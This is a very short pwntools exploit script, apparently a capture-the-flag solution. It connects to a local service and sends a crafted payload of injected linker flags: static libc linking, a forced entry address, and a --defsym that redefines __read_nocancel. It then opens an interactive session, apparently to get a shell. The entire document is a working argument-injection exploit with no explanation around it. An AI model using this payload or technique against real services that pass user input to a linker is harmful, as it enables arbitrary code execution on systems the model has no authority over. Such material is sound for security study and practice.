from pwn import *

p = remote('localhost', 5000)

p.sendline(b'_init,--whole-archive,-static,/lib/x86_64-linux-gnu/libc.a,--no-whole-archive,-zmuldefs,-Bdynamic,/usr/local/lib64/libgcc_s.so,--no-dynamic-linker,-entry=0x5550e7,--defsym=__read_nocancel=0x4eb55f')
p.interactive()
